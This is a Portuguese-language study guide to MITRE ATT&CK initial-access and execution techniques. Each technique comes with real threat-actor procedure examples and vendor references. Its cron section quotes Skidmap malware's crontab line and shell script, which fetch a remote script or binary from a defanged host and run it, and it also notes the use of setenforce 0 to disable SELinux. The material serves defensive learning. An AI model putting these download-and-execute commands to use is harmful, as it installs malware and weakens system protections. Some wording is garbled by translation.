.005 **Destino de Link:** Links podem ser usados para spearphishing, como enviar um e-mail acompanhado de texto de engenharia social para persuadir o usuário a clicar ou copiar ativamente e colar uma URL em um navegador. Antes de um phish para informações (como em Spearphishing Link) ou um phish para obter acesso inicial a um sistema (como em Spearphishing Link), um adversário deve configurar os recursos para um alvo de link para o link spearphishing.

**Exemplo de procedimento:** Denominado Bibliotecário silencioso clonou páginas de login da organização das vítimas e as encenou para o uso posterior em campanhas de coletas de credenciais, usou encurtadores de URL para esses sites fakes.

**REFERÊNCIA:** https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta407-silent-librarian

TA0001 **ACESSO INICIAL:** 

O Acesso Inicial consiste em técnicas que usam vários vetores de entrada para ganhar sua base inicial dentro de uma rede. As técnicas usadas para ganhar posição incluem spearphishing direcionado e exploração de fraquezas em servidores web voltados para o público. As bases obtidas através do acesso inicial podem permitir o acesso contínuo, como contas válidas e uso de serviços remotos externos, ou podem ser limitadas devido à alteração de senhas.

T1189 **COMPROMISSO DE DRIVE-BY:** Os adversários podem ter acesso a um sistema através de um usuário que visita um site durante o curso normal de navegação. Com essa técnica, o navegador do usuário é normalmente alvo de exploração, mas os adversários também podem usar sites comprometidos para comportamentos não exploratórios, como a aquisição de Token de Acesso ao Aplicativo. Existem várias formas de fornecer código de exploração a um navegador como: Um site legítimo é comprometido onde os adversários injetaram alguma forma de código malicioso, anuncios maliciosos, interfaces incorporadas de aplicativos WEB, etc.

**Exemplo de procedimento:** O site Forbes.com foi usado para comprometer alvos selecionados através de watering hole uma exploração do adobe flash de 0 day, os ataques começaram por entregas de e-mail de phishing e tambem se passando de sites legítimos que havia sido comprometidos anteriormente.

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/new-attacks-linked-to-c0d0s0-group/

T1190 **EXPLORAÇÃO DE APLICATIVO VOLTADO AO PUBLICO:** Os adversários podem tentar tirar vantagem de uma fraqueza em um computador ou programa voltado para a Internet usando software, dados ou comandos, a fim de causar comportamentos não intencionais ou inesperados. A fraqueza no sistema pode ser um bug, uma falha ou uma vulnerabilidade de design. 

**Exemplo de procedimento:** Um grupo de hacker que comprometeram as organizações alvo atacando seus servidores web, através de ataques de injecção SQL, a fim de injetar um malware

**REFERÊNCIA:** https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/chafer-latest-attacks-reveal-heightened-ambitions

T1133 **SERVIÇO REMOTO EXTERNO:** Os adversários aproveitam serviços remotos voltados para acessar externamente ou persistir inicialmente dentro de uma rede, serviços remotos como VPNs, Citrix e outros mecanismos de acesso permitem que os usuários se conectem aos recursos internos da rede corporativa a partir de locais externos

**Exemplo de procedimento:** Um malware nomeado GoldMax foi descoberto nas redes como uma tarefa programada se passando de software de gerenciamento de sistemas, ele é escrito em Go, atua como backdoor de comando, ele usa técnicas de ofuscação para evitar a detecção, ele escreve um arquivo de configuração criptografada em disco.

**REFERÊNCIA:** https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/

T1200 **ADIÇÃO DE HARDWARE:** Os adversários podem introduzir acessórios de computador, computadores ou hardware de rede em um sistema ou rede que pode ser usado como vetor para obter acesso. Embora as referências públicas de uso por atores de ameaças sejam escassas, muitos /testadores de penetração aproveitam as adições de hardware para acesso inicial.

**Exemplo de procedimento:** Uso de dispositivos de ataque como Netbook, Raspberry Pi e bash bunny dentro de uma organização, segunda etapa é os atacantes se conectarem remotamento ao dispositivo e digitalizarem a rede local buscando obter acesso a pastas públicas compartilhadas, servidores web e quaisquer outros recursos.

**REFERÊNCIA:** https://securelist.com/darkvishnya/89169/

T1091 **REPLICAÇÃO ATRAVÉS DE MÍDIA REMOVÍVEL:** Os adversários podem passar para sistemas, possivelmente aqueles em redes desconectadas ou com falhas, copiando malware para mídia removível e aproveitando os recursos do Autorun quando a mídia é inserida em um sistema e executa. 

**Exemplo de procedimento:** A infecção normalmente ocorre através de um disco removível como um pen drive, ou qualquer outro disco rígido externo. Uma vesz que o disco removível esteja conectado a um computador infectado pelo agent.btz o malware ativo detectará uma unidade recém reconhecida, e soltará sua cópia nele e criará o arquivo autorun.inf com uma instrução para executar um arquivo.

**REFERÊNCIA:** http://blog.threatexpert.com/2008/11/agentbtz-threat-that-hit-pentagon.html

T1195 **CADEIA DE SUPRIMENTOS:** Os adversários podem manipular produtos ou mecanismos de entrega de produtos antes do recebimento por um consumidor final para fins de comprometimento de dados ou sistemas.

.001 **COMPROMETIMENTO DE DEPENDÊNCIAS DE SOFTWARE E FERRAMENTAS DE DESENVOLVIMENTO:** Muitas vezes, os aplicativos dependem de software externo para funcionar corretamente. Projetos populares de código aberto que são usados como dependências em muitos aplicativos podem ser direcionados como um meio de adicionar código malicioso aos usuários da dependência. O direcionamento pode ser específico para um conjunto de vítimas desejado ou pode ser distribuído para um amplo conjunto de consumidores, mas apenas passar para táticas adicionais sobre vítimas específicas.

**Exemplo de procedimento:** O XCSSET adiciona um código malicioso aos projetos Xcode de um host, enumerando arquivos cacaupods sob a pasta e enumera todas as pastas sob um determinado diretório, então é baixado um script e arquivo mach-0 na pasta do projeto
target_integrator.rb/Library/Ruby/Gems.xcodeproj

**REFERÊNCIA:** https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf

.002 **Fornecimento de Software:** O comprometimento da cadeia de suprimentos do software pode ocorrer de várias maneiras, incluindo manipulação do código fonte do aplicativo, manipulação do mecanismo de atualização/distribuição para esse software ou substituição de versões compiladas por uma versão modificada.

**Exemplo de procedimentos:** A empresa CCleaner tinha sido alvo de cybercriminosos, o malware foi introduzido no servidor de construção, o primeiro estágio foi coletar informações não confidenciais como nome do PC, lista de softaware.

**REFERÊNCIA:** https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities

.003 **Fornecimento de hardware:** Modificando hardware ou firmware na cadeia de suprimentos, os adversários podem inserir um backdoor em redes de consumidores que podem ser difíceis de detectar e dar ao adversário um alto grau de controle sobre o sistema. Backdoors de hardware podem ser inseridos em vários dispositivos, como servidores, estações de trabalho, infraestrutura de rede ou periféricos.

T1199 **RELACIONAMENTO CONFIÁVEL:** Os adversários podem violar ou aproveitar as organizações que têm acesso às vítimas pretendidas. O acesso através de relacionamento de terceiros confiáveis explora uma conexão existente que pode não ser protegida ou recebe menos escrutínio do que mecanismos padrão de obter acesso a uma rede.

**Exemplo de procedimentos:** Usando o REvil um ransomware que permite explorar vulnerabilidade para elevar previlégios, encerrar processos na lista negra antes da criptografia, criptografar arquivos e pastas não listados em dispositivos de armazenamento e exfiltrar informações básicas do host.

**REFERÊNCIA:** https://www.secureworks.com/research/revil-sodinokibi-ransomware

 T1078 **CONTAS VÁLIDAS:** Os adversários podem obter e abusar de credenciais de contas existentes como um meio de obter acesso inicial, persistência, escalada de privilégios ou evasão de defesa. Credenciais comprometidas podem ser usadas para contornar controles de acesso colocados em vários recursos em sistemas dentro da rede e podem até ser usados para acesso persistente a sistemas remotos e serviços disponíveis externamente, como VPNs, Outlook Web Access e desktop remoto.
 
 .001 **Contas Padrões:** As contas padrão são aquelas que são incorporadas a um SO, como as contas do Convidado ou administrador em sistemas Windows. As contas padrão também incluem contas padrão de fábrica/provedor em outros tipos de sistemas, software ou dispositivos, incluindo a conta de usuário raiz no AWS e a conta de serviço padrão em Kubernetes. 
 
 **Exemplo de procedimentos:** Um malware personalizado incluindo ferramentas herdadas atualizadas, projetadas para manter a persistência através da sobreposição de acesso ao backdoor, evitando defesas das vítimas.
 
 **REFERÊNCIA:** https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity
 
 .002 **Contas de domínio:** As contas de domínio são aquelas gerenciadas pelos Serviços de Domínio do Active Directory, onde o acesso e as permissões são configurados entre sistemas e serviços que fazem parte desse domínio. As contas de domínio podem cobrir usuários, administradores e serviços.
 
 **Exemplo de procedimento:** O atacante começa com a obtenção de nomes de usuários e senhas das vítimas de violações anteriores, essas credenciais são usadas em um spray de senhas contra os serviços remotos da vitima, como webmail e outros serviços de correio. Após a obtenção de uma conta válida eles usam essas contas para acessar a VPN.
 
 **REFERÊNCIA:** https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/

.003 **Contas Locais:** As contas locais são aquelas configuradas por uma organização para uso por usuários, suporte remoto, serviços ou para administração em um único sistema ou serviço. Contas locais também podem ser abusadas para elevar privilégios e colher credenciais através do Dumping de Credenciais do OS. O reaproveitamento de senhas pode permitir o abuso de contas locais em um conjunto de máquinas em uma rede para fins de Escalada de Privilégios e Movimento Lateral.

**Exemplo de procedimento:** Os atacantes aproveitam metodos de engenharia social para atrair vítimas para habilitar macros, após a execução o arquivo inicia Downloads de várias cargas maliciosas de servidores remotos. Os atacantes continuam a fornecer os anexos maliciosos através de email de phishing

**REFERÊNCIA:** https://www.mandiant.com/resources/cyber-espionage-apt32

.004 **Contas em nuvem:** Contas em nuvem são aquelas criadas e configuradas por uma organização para uso por usuários, suporte remoto, serviços ou para administração de recursos dentro de um provedor de serviços em nuvem ou aplicativo SaaS. Em alguns casos, as contas em nuvem podem ser federadas com o sistema tradicional de gerenciamento de identidade, como o Window Active Directory.

**Exemplo de procedimento:** Atacantes usaram o Ruler para configurar uma URL do Outlook Home page, especialmente criada para explorar a vulnerabilidade de desvio de segurança, ela aciona a execução remota de código de um script quando um cliente do outlook sincronizado com uma caixa de correio e tornou o URL do perfil Home page, script é geralmente feito em VBSScript seguidos pelo PowerShell.

**REFERÊNCIA:** https://www.microsoft.com/security/blog/2020/06/18/inside-microsoft-threat-protection-mapping-attack-chains-from-cloud-to-endpoint/


TA0002 **EXECUÇÃO:**

Atacante tentando executar o código malicioso. A execução consiste em técnicas que resultam em código controlado por adversários em um sistema local ou remoto. São técnicas que executam códigos que são frequentemente emparelhadas com técnicas de todas as outras táticas para alcançar objetivos como explorar rede ou roubar dados.

T1059 **INTERPRETE DE COMANDO E SCRIPT:** Os adversários podem abusar de intérprete de comandos e script para executar comandos, scripts ou bínarios. Essas interaces e linguagens tem maneiras de interagir com sistemas de computador. Os sistemas vem com alguns recursos de linha de comando e scripting integrados.

.001 **PowerShell:** Os atacantes podem usar o PoweShell para executar uma série de ações, incluindo a descoberta de informações e a execução de códigos. podemos citar o cmdlet que pode ser usado para executar um executável, o cmldlet executa um comando localmente em um computador remoto.

**Exemplo de procedimentos:**  Um cmdlet é um comando leve que é usado no ambiente do PowerShell. O tempo de execução do PowerShell invoca esses cmdlets dentro do contexto de scripts de automação que são fornecidos na linha de comando. O tempo de execução do PowerShell também os chama programaticamente por meio de APIs do PowerShell.

**REFERÊNCIA:** https://docs.microsoft.com/pt-br/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.2

.002 **Apple Script:** É uma linguagem de scripting macOS que é projetada para controlar aplicativos e parte do SO através de mensagens appleEvents.

**Exemplo de procedimentos:** Podemos executar a partir de linhas de comandos. Além os scripts podem ser executados de várias maneiras, incluindo regas de Mail, alarmes de calendar.app, pode ser executados como scripts shell de texto, só precisamos adicionar no inicio do arquivo de script. osascript /path/to/scriptosascript -e "script here"#!/usr/bin/osascript. 

**REFERÊNCIA** https://objective-see.com/blog/blog_0x59.html

.003 **Shell de comando do Windowns:** O prompt de comando do Windowns pode ser usado para controlar quase qualquer aspecto de um sistema com vários níveis de permissão necessários para diferentes subconjuntos de comandos.

**Exemplo de procedimento:**    Os adversários podem aproveitar o CMD para executar vários comandos e cargas. Os usos comuns incluem cmd para executar um único comando, ou abusar do cmd interativamente com entrada e saída encaminhados sobre um canal de comando e controle.

**REFERÊNCIA:** https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf

.004 **Unix Shell:** Os shells Unix são o principal prompt de comando em sistemas Linux e macOS, embora existam muitas variações do shell Unix, exemplos: .sh bash, zsh, etc. Os projéteis Unix também suportam scripts que permitem a execução sequencial de comandos, bem como outras operações típicas de programação, como condicionais e loops.

**Exemplo de procedimento:** Um malware chamado adobe Zii ele ajuda na pirataria de uma variedade de aplicativos da adobe, eke é um falso aplicativo com um automatizador e revela a natura do software pois ele executa um script shell, o script é projetado para baixar e executar um script em python.

**REFERÊNCIA:** https://blog.malwarebytes.com/threat-analysis/2018/12/mac-malware-combines-empyre-backdoor-and-xmrig-miner/

.005 **Visual Basic:** VB é uma linguagem de programação criada pela Microsoft com interoperabilidade com muitas tecnologias do Windows, como o Component Object Model e a API nativa através da API do Windows.

**Exemplo de procedimento:** A primeira etapa usando um documento com um VBA Malicioso do Microsoft Word entregue dentro de um arquivo ZIP. Uma vez que o documento é aberto, macros maliciosos são baixados usando o recurso de modelo externo. O código das macros, por sua vez, cai e executa a segunda fase do ataque, um script PowerShell criptofrafado dentro do cocumento origial do Word, e finalmente o script do PowerShell baixa e executa a última etapa da infecção.

**REFERÊNCIA:** https://research.checkpoint.com/2020/bandook-signed-delivered/

.006 **Python:** Python é uma linguagem de scripting/ programação, pode ser executado interativamente a partir da linha de comando.

**Exemplo de procedimento:** Um malware focado em roubo de informações bancárias e credenciais de mensageiro instantâneos como o discord, além de navegadores como Edge e google chrome, foi dispinibilizado por criminosos em um repositorio oficial em python.

**REFERÊNCIA:** https://canaltech.com.br/seguranca/malware-que-rouba-dados-de-cartao-estava-em-biblioteca-oficial-de-programacao-191414/.

.007 **JavaScript:** É uma linguagem de script independente da plataforma (compilada just-in-time no tempo de execução) comumente associada a scripts em páginas da Web, embora o JS possa ser executado em ambientes de tempo de execução fora do navegador.

**Exemplo de procedimento:** Alvos são abordados com e-mail de spearphising que contÊm um link para um arquivo ZIP hospedado no google Drive. Esse arquivo contém vários arquivos LNK que extraem e executam um componente JS malicioso, enquanto exibem um documento de isca.

**REFERÊNCIA:** https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/

.008 **Dispositivo de rede CLI:** O CLI é o principal meio através do qual usuários e administradores interagem com o dispositivo a fim de visualizar informações do sistema, modificar as operações do dispositivo ou executar funções diagnósticas e administrativas. Os CLIs normalmente contêm vários níveis de permissão necessários para diferentes comandos

**Exemplo de procedimento:** O CLI pode ser usado para manipular fluxos de tráfego para interceptar ou manipular dados, modificar parâmetros de configuração de inicialização para carregar softwares de sistema maliciosos ou desativar recursos de segurança ou login para evitar a detecção.

**REFERÊNCIA:** https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices

T1609 **COMANDO DE ADMINISTRAÇÃO DE CONTÊINERES:** Os adversários podem abusar de um serviço de administração de contêineres para executar comandos dentro de um contêiner. Um serviço de administração de contêineres, como o daemon Docker, o servidor API Kubernetes ou o kubelet, podem permitir o gerenciamento remoto de contêineres dentro de um ambiente.

**Exemplo de procedimento:** Um grupo de hackers ganharam acesso através de um Kubelet mal configurado que permitiu acesso anônimo. O atacante começou explorando um Kubelet inseguro na internet e procurou contêineres correndo dentro dos nódulos Kubernetes. Depois de encontrar o contêiner o invador tentou realizar a execução remota de código 

**REFERÊNCIA: https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/

T1610 **IMPLANTAR CONTÊINER:** Os adversários podem implantar um contêiner em um ambiente para facilitar a execução ou evitar defesas. Em alguns casos, os adversários podem implantar um novo contêiner para executar processos associados a uma determinada imagem ou implantação, como processos que executam ou baixam malware

**Exemplo de procedimento:** Ngrok botnet é um malware que o ataque se inicia abusando dos recursos de configuraçãp do docker para iludir as restrições padrão do contêiner e executar várias cargas maliciosas do host, eles também escameam a rede e usam para digitalizar faixas de Ips dos provedores de nuvem.

**REFERÊNCIA:** https://www.intezer.com/blog/cloud-security/watch-your-containers-doki-infecting-docker-servers-in-the-cloud/

T1203 **Exploração para Execução de Clientes:** Os adversários podem explorar vulnerabilidades de software em aplicativos do cliente para executar algum código. Vulnerabilidades podem exsistir devido práticas de codificação inseguras que podem levar comportamentos inesperados. Existem vários tipos de explorações como: Baseada em navegador, aplicações de escritorios, aplicações comuns de terceiros.

**Exemplo de procedimentos:** Atacantes enviaram e-mail de phishing para várias organizações de mídia, os e-mails continham 3 anexos no total, cada um deles exploravam uma vulnerabilidade mais antiga no Microsoft Office. Este backdoor, conhecido como LOWBALL, usa o serviço legítimo de armazenamento
em nuvem Dropbox para atuar como o servidor CnC. Ele usa a API do Dropbox com um token de acesso ao portador codificado e tem a capacidade de baixar, carregar e executar arquivos. A comunicação ocorre via HTTPS sobre a porta 443.

Após a execução, o malware usará a API do Dropbox para fazer uma solicitação HTTP GET usando HTTPS sobre a porta TCP 443

**REFERÊNCIA:** https://www.mandiant.com/resources/china-based-threat 

T1559 **Comunicação interprocesso:** Os atacantes podem usar dos mecanismos de comunicação IPC para execução de código local ou comando. O IPC também é usado para evitar situações como impasses que ocorrem quando os processos estão presos em um padrão de espera.

**Exemplo de procedimento:** Atacantes utilizaram backdoors baseados em procedimentos remotos RPC, como o HyperStack e trojans de administração remota RATs, como Kazuar. Os RATs transmitem o resultado de execução de comando e exfiltram dados da rede da  vítima.

**REFERÊNCIA:** https://www.accenture.com/us-en/blogs/cyber-defense/turla-belugasturgeon-compromises-government-entity

.001 **Modelo de objeto componente:** Os atacantes podem usar com o Windowns Component Object Model) para execuçãp de código local. 

**Exemplo de procedimento:** Um macro voltado para o microsoft Outlook, usa a conta de email do alvo para enviar emails de spearphishing para contatos no catálogo de endereços do Microsoft Office da vítima. Usando linguagem variando de C# a VBScript, arquivos em lote e C/C++

![image](https://user-images.githubusercontent.com/95362045/153612459-9c938d0d-6eb6-433a-a4d7-7a076d743215.png)

**REFERÊNCIA:** https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/

.002 **Troca de dados dinâmico:** Os adversários podem usar o DDE (Windows Dynamic Data Exchange, troca de dados dinâmicos) para executar comandos arbitrários. O DDE é um protocolo cliente-servidor para comunicação interprocesso único e/ou contínuo (IPC) entre aplicativos.

**Exemplo de procedimento? Os atacantes geralmente comeãm com uma campanha de email, voltado para instituições financeiras. Os e-mails contêm uma URL apontando para 3 tipos de documento, documentos compostsos do Word OLE com código de macro VBA, documentaç~pes RTF explorando Microsoft Office ou documento PDF

**REFERÊNCIA:** https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html

T1106 **API NATIVA:** Os adversários podem interagir com a interface nativa de programação de aplicativos de SO (API) para executar comportamentos. As APIs nativas fornecem um meio controlado de chamar serviços de SO de baixo nível dentro do kernel, como aqueles que envolvem hardware/dispositivos, memória e processos.

**Exemplo de procedimento:** Um email malicioso enviado para a embaixada do governo continha um arquivo RTF com o construtor de exploração, que lançou um carregador nomeada para a pasta de inicialização do Word do PC Alvo

![image](https://user-images.githubusercontent.com/95362045/153616040-aa62f8ed-5444-4720-a429-bbf8800dfd74.png)

**REFERÊNCIA:** https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/

T1053 **TRABALHO AGENDADO:** Os adversários podem abusar da funcionalidade de agendamento de tarefas para facilitar a execução inicial ou recorrente de código malicioso. Uma tarefa pode ser agendada em um sistema remoto desde que a autenticação adequada seja atendida. 

**Exemplo de procedimento:** Um anexo XLS malicioso enviado em um e-mail de phishing, contendo um macro ofuscada que baixa um downloader de segundo estágio fortemente embalado. O segundo estágio busca  o terceiro estágio criptografado, que inclui três lokibot criptografados em camadas 

![image](https://user-images.githubusercontent.com/95362045/153784865-d1045359-155c-4bac-9cc5-048c3272d475.png)

**REFERÊNCIA:** https://blog.talosintelligence.com/2021/01/a-deep-dive-into-lokibot-infection-chain.html

.001 **Em Linux:** Um adversário pode usar em ambientes Linux para executar programas na inicialização do sistema ou em uma base programada para persistência, também pode ser abusado para realizar execução remota como parte para executar um processo no contexto de uma conta especifica

**Exemplo de procedimento:** Atacantes no Linux muitas vezes tentam estabelecer persistência para que eles possam manter o acesso a um host. A maneira mais comum de fazer isso é com um trabalho de cron que está programado para executar e reinstalar malware se ele tiver sido removido. No entanto, um método de persistência muitas vezes negligenciado está colocando empregos programados no Linux no job scheduler.

**REFERÊNCIA:** https://www.linkedin.com/pulse/getting-attacker-ip-address-from-malicious-linux-job-craig-rowland/

.002 **Windowns:** Um utilitário chamado at existe como um executável dentro do Windowns para agendar tarefas em uma hora e data específica 

**Exemplo de procedimento:** Agenda comandos e programas para serem executados em um computador em uma hora e data especificadas. Você só pode usar quando o serviço De programação estiver em execução. Usado sem parâmetros, em listas de comandos programados.

em [\\ComputerName] [{[ID] [/delete]| /delete [/sim]}]

em [[\\ComputerName] horas:minutos [/interativo] [{/todas as:datas[,...]| /next:date[...]}] comando]

**REFERÊNCIA:** https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490866(v=technet.10)?redirectedfrom=MSDN

.003 **COMPARSA:** Os atacantes utilizam agendamento de tarefas para uma execução de código malicioso chamado .cron. É um programador de trabalho baseado no tempo para sistemas operacionais semelhantes ao Unix. Contém o cronograma de entradas de cron a serem executadas e horários especificos.

**Exmplo de procedimento:** O malware se instala via crontab (lista de comandos que são executados em um cronograma regular) em sua máquina de destino, como mostrado abaixo:

*/1 * * * * curl -fsSL hxxp://pm[.]ipfswallet[.]tk/pm.sh | sh

O script de instalação pm.sh então baixa o "pc" binário principal (detectado pela Trend Micro como Trojan.Linux.SKIDMAP.UWEJX):

if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   wget -c hxxp://pm[.]ipfswallet[.]tk/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   get -c hxxp://pm[.]ipfswallet[.]tk/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc else
   url -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc fi
   
   Após a execução do binário "pc", ele diminuirá as configurações de segurança da máquina afetada. Se o arquivo /usr/sbin/setenforce existir, o malware executará o comando, setenforce 0. Este comando configura o módulo SELinux (Security-Enhanced Linux) do sistema, que fornece suporte nas políticas de controle de acesso do sistema, no modo permissivo — ou seja, definindo a política SELinux para que não seja aplicada. 
   
   **REFERÊNCIA:** https://www.trendmicro.com/en_us/research/19/i/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload.html
   
.004 **Temporizadores:**  Os temporizadores sistematos são arquivos unitários com extensão de arquivo que controlam os serviços. Os temporizadores podem ser definidos para serem executados em um evento de calendário ou após um período de tempo em relação a um ponto de partida. Eles podem ser usados como uma alternativa ao Cron em ambientes Linux..timer. Os temporizadores sistematados podem ser ativados remotamente através do utilitário da linha de comando, que opera sobre ssh.

**Exemplo de procedimento:** Temporizador mmonotônico  que começa por 15 minutos após a inicialização e toda semana equanto o sistema estiver funcionando.  

/etc/systemd/system/foo.timer
[Unit]
Description=Run foo weekly and on boot

[Timer]
OnBootSec=15min
OnUnitActiveSec=1w

[Install]
WantedBy=timers.target

No exemplo abaixo o serviço é executado nos primeiros quatro dias de cada mês às 12:00 pm, mas apenas se esse dia for uma segunda ou uma terça-feira.

OnCalendar=Mon,Tue *-*-01..04 12:00:00

**REFERÊNCIA:** https://wiki.archlinux.org/title/Systemd/Timers

.005 **Trabalho de orquestração de contêineres:** Os adversários podem abusar da funcionalidade de agendamento de tarefas fornecida por ferramentas de orquestração de contêineres, como o Kubernetes, para agendar a implantação de contêineres configurados para executar códigos maliciosos. 

**Exemplo de procedimento:** Em Kubernetes, um CronJob pode ser usado para agendar um Trabalho que executa um ou mais contêineres para executar tarefas específicas.Um adversário, portanto, pode utilizar um CronJob para agendar a implantação de um Trabalho que executa código malicioso em vários nós dentro de um cluster.

![image](https://user-images.githubusercontent.com/95362045/154093450-5bbf746f-f922-4151-bd36-cfe7906cfb73.png)

![image](https://user-images.githubusercontent.com/95362045/154093539-11213bf0-1018-4578-a389-107c54166956.png)

**REFERÊNCIA:** https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/ 

T1129 **MÓDULOS COMPARTILHADOS:** Os atacantes podem executar cargas maliciosas através do carregamento de módulos compartilhados. O carregador de módulos Windowns pode ser intruído a carregar DLLs de caminhos locais arbitrários e caminhos de rede. Essa funcionalidade reside em NTDLL.DLL e faz parte da API nativa do windowns, que é chamada de funções como da API Win32  CreateProcessLoadLibrary

**EXEMPLO DE PROCEDIMENTO: O malware BackSwap se esconde em réplicas de programas legítimos como OllyDbg, 7-Zip e FileZilla. Ele planta seu código malicioso na fase de inicialização do programa, em um estágio inicial da execução do programa, substituindo o fluxo normal por suas instruções maliciosas. O programa não retornará à sua execução normal depois que o código malicioso começar a ser executado.

**REFERÊNCIA:** https://www.cyberbit.com/blog/endpoint-security/dtrack-apt-malware-found-in-nuclear-power-plant/

T1072 **Implatação de Software:** Os adversários podem ter acesso e usar suítes de software de terceiros instaladas dentro de uma rede corporativa, como sistemas de administração, monitoramento e implantação, para se mover lateralmente através da rede. Aplicativos de terceiros e sistemas de implantação de software podem estar em uso no ambiente de rede para fins de administração (por exemplo, SCCM, HBSS, Altiris, etc.)

**Exemplo de procedimento:** Uma campanha aproveitou arquivos ActiveMime que empregavam métodos de engenharia social para atrair a vítima para habilitar macros . E posteriormente a execução o arquivo inicial downloads de várias cargas maliciosas de servidores remotos.
Os atacantes projetam documentos de isca que é adaptado para vítimas específicas. Embora os arquivos tivessem extensões de arquivo .doc, as iscas de phishing recuperadas eram arquivos de páginas da Web do ActiveMime.

**REFERÊNCIA:** https://www.mandiant.com/resources/cyber-espionage-apt32

T1569 **SERVIÇOS DO SISTEMA:** Os adversários podem executar conteúdo malicioso interagindo ou criando serviços local ou remotamente. Muitos serviços são definidos para serem executados no boot, o que pode ajudar a alcançar a persistência.

.001 ** Launchctl:** Os atacantes usam o lauchctl para executar comandos e programas como Agentes de lançamento. Os adversários podem usar scripts ou executar manualmente os comandos ao executar Agentes de lançamento. 

Agente de lançamento: Os agentes de lançamento são frequentemente instalados para executar atualizações em programas, iniciar programas especificados pelo usuário no login ou para realizar outras tarefas de desenvolvedor.

**EXEMPLO DE PROCEDIMENTO:**  Um e-mail de phishing de uma empresa  recomendou o aplicativo de negociação de criptomoedas trojanizado às vítimas. O e-mail forneceu um link para o site , onde a vítima poderia baixar uma versão windows ou macOS do aplicativo trojanizado. 
A versão windows do aplicativo Malicioso Celas Trade Pro é um instalador MSI. O pacote de instalação do INSTALADOR MSI compreende um componente de software e uma interface de programação de aplicativos (API) que a Microsoft usa para a instalação, manutenção e remoção de software. O instalador parece legítimo e é assinado por um certificado Sectigo válido que foi comprado pelo mesmo usuário do certificado SSL. O Instalador MSI pede à vítima privilégios administrativos para executar o arquivo Malicioso

**REFERENCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa21-048a

.002 **Execução de Serviços:** O gerenciador de controle de serviços do Windowns é uma interface para gerenciar e manipular serviços. services.exe. O gerenciador de controle de serviços é acessível aos usuários através de componentes de GUI.

**Exemplo de procedimento:** A âncora pode criar e executar serviços para carregar sua carga útil : O ataque começa com um e-mail de phishing que contém um link malicioso para um arquivo hospedado no Google Docs chamado "Relatório anual de bônus.doc". Quando o usuário clica no link, o trickBot é baixado na máquina de destino. As campanhas usam um Downloader TrickBot que é assinado e usa um ícone para fingir que é um documento do Microdoft Word, Quando o usuário clica duas vezes no arquivo, ele é apresentado com uma caixa de mensagem chamariz. Para evitar suspeitas, as mensagem sugere que o usuário deve utilizar o Microsoft Word ou abrir o arquivo de outro computador. A maioria das cargas iniciais nessas campanhas são assinadas com certificados válidos para evitar ferramentas de segurança. Eles abusam da confiança relativa que é dada aos binários assinados para evitar a detecção.

![image](https://user-images.githubusercontent.com/95362045/154123580-50f4c988-4fd6-4e35-83a2-897811c32fc3.png)

![image](https://user-images.githubusercontent.com/95362045/154123602-6278f5f6-9a13-45a7-8704-a9472896b630.png)

A caixa de mensagens distrai o usuário à medida que a carga do TrickBot é baixada, armazenada na pasta %TEMP% e executada. Um novo processo injeta a carga TrickBot em um processo .exe svchost.

![image](https://user-images.githubusercontent.com/95362045/154123662-baa49ae9-cf9f-434e-abbf-d5e5904fa240.png)

**REFERÊNCIA:** https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware

T1204 **EXECUÇÃO DO USUÁRIO:** Os usuários podem ser submetidos à engenharia social para fazê-los executar códigos maliciosos, por exemplo, abrindo um arquivo ou link de documento malicioso. Essas ações de usuário serão normalmente observadas como comportamento de acompanhamento de formas de phishing.

.001 **Link Malicioso:** Um atacante pode ter a colaboração da vítima em interagir clicando em links maliciosos para obter certas execuções, as vítimas podem cair em golpes como engenharia social para força-los de forma intencional  a clicar em links que levará à execução de scripts.

**Exemplo de procedimento:**  A vítima recebeu um email malicioso, que foi escrito em alemão e foi anexado com um arquivo zip protegido por senha que continha um arquivo de documento malicioso. Este e-mail de phishing pertencia a uma campanha de atacantes chamada EMOTET, o documento continha um Código VBA malicioso que usa WMI (winmgmts:win32_processStartup) para lançar o Power Shell com código codificado. Este por sua vez baixa uma segunda carga útul que é o trojan bancário EMOLET para comprometer a máquina da vítima.

**REFERÊNCIA:** https://blogs.vmware.com/security/2019/04/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code.html

